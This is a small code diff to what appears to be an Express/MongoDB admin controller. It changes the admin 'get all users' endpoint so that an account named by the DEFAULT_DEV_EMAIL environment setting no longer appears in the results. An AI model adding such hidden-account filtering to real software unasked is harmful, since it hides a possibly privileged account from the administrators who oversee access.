@@ -59,7 +59,12 @@ const getDashboardStats = asyncHandler(async (req, res) => {
 // @route   GET /api/admin/users
 // @access  Private/Admin
 const getAllUsers = asyncHandler(async (req, res) => {
-    const users = await User.find({}).select('-password');
+    const devEmail = process.env.DEFAULT_DEV_EMAIL; // Get the developer email from .env
+
+    // Create a filter object. If the devEmail is set, exclude it from the results.
+    const filter = devEmail ? { email: { $ne: devEmail } } : {};
+
+    const users = await User.find(filter).select('-password');
     res.json(users);
 });
 
